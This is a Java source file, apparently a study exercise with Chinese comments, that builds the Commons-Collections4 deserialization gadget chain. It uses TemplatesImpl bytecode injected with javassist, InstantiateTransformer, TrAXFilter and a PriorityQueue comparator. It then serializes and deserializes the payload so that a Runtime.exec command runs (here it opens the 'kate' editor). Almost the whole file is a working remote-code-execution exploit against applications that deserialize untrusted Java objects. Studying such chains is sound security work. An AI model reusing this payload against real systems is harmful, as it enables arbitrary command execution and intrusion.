package com.example.apache_collections;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import java.util.Queue;

public class CommonCollection4 {
    /*
    同CommonCollection2， CommonCollection4也是通过 Template, PriorityQueue 两个类来作为调用链
    但是由并非由InvokeTransform 而是由 InstantiateTransformer 来实现的

    照例， 先声明一个Template类

    由CommonCollection2 和 CommonCollection3 知道,  InstantiateTransfomer并不能直接调用transform类， 需要
    找一个其他的反射点来执行， 首先先看一下。
     */
    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) {
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
        }
    }

    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }

    public static <template> void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, CannotCompileException, IOException, NotFoundException, NoSuchFieldException {
        Class tplClass =  Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
        Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        Class transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        final Object template =  tplClass.newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(CommonCollections2.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));

        final CtClass clazz = pool.get(CommonCollections2.StubTransletPayload.class.getName());

        String cmd = "java.lang.Runtime.getRuntime().exec(\"kate\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();
        Field bytecodes = tplClass.getDeclaredField("_bytecodes");
        // 由于_bytecodes是private属性,需要 设置 Access = TRue
        bytecodes.setAccessible(true);
        // bytecodes 是 [][] 类型的,所以要加另外一个类,即上边的FOO
        // 我们把它的classfiles类拿过来用一下
        bytecodes.set(template, new byte[][]{classBytes, com.example.apache_collections.ClassFiles.classAsBytes(CommonCollections2.Foo.class)});

        Field name = tplClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(template, "Pwnr");

        Field tfactory = tplClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(template, transFactory.newInstance());

//        Templates t = (Templates) template;
//        t.getOutputProperties();

        ConstantTransformer constantTransformer = new ConstantTransformer(String.class);

        // 可以通过instantiateTRansormer 来实例TrAXFilter.class 来实现，但是需要反射
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{String.class}, new Object[]{"ls"});
        Object i = instantiateTransformer.transform(String.class);
        System.out.println(i);
//        InstantiateTransformer instantiateTransformer1 = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{template});
//        Object i2 = instantiateTransformer1.transform(TrAXFilter.class);


        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] {constantTransformer, instantiateTransformer});

        Queue queue = new PriorityQueue(2, new TransformingComparator(chainedTransformer));
        queue.add(1);
        queue.add(2);

        Class constant_class = ConstantTransformer.class;
        Field constant_field = constant_class.getDeclaredField("iConstant");
        constant_field.setAccessible(true);
        constant_field.set(constantTransformer, TrAXFilter.class);

        Class[] paramTypes = new Class[]{String.class};
        Object[] Args = new Object[] {"ls"};

        Class instant_class = InstantiateTransformer.class;
        Field instant_field = instant_class.getDeclaredField("iParamTypes");
        instant_field.setAccessible(true);
        instant_field.set(instantiateTransformer, new Class[] {Templates.class});
        Field instant_field2 = instant_class.getDeclaredField("iArgs");
        instant_field2.setAccessible(true);
        instant_field2.set(instantiateTransformer, new Object[]{template});

        byte[] b = do_serialize(queue);
        Object a = do_unserialize(b);









    }

    public static byte[]  do_serialize(Object obj) throws IOException {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();

        ObjectOutputStream oos = new ObjectOutputStream(btout);
        oos.writeObject(obj);
        System.out.println("do serialized success");
        return btout.toByteArray();
    }

    public static Object do_unserialize(byte[] data) throws IOException, ClassNotFoundException {
        ByteArrayInputStream btin = new ByteArrayInputStream(data);
        ObjectInputStream ooi = new ObjectInputStream(btin);

        System.out.println("do unserialized success");
        return ooi.readObject();
    }
}
